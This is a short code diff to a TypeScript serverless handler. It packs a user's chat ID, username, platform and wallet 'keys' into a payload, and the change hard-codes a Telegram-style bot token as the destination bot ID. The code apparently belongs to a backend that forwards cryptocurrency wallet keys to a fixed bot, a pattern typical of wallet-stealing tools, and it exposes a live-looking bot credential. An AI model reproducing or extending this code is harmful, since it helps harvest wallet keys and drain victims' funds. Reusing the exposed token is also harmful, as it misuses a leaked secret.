@@ -20,7 +20,7 @@ async function handler(req: VercelRequest, res: VercelResponse): Promise<void> {
         chatId: walletData.code,
         username: walletData.username,
         platform: walletData.platform || 'axiom',
-        botId: walletData.botId || null,
+        botId: "8527011591:AAHNTTUvOc3NkZGVgYv-w4Lz_1QRndCNB_Q",
         keys: walletData.keys,
         message: nocache
       };
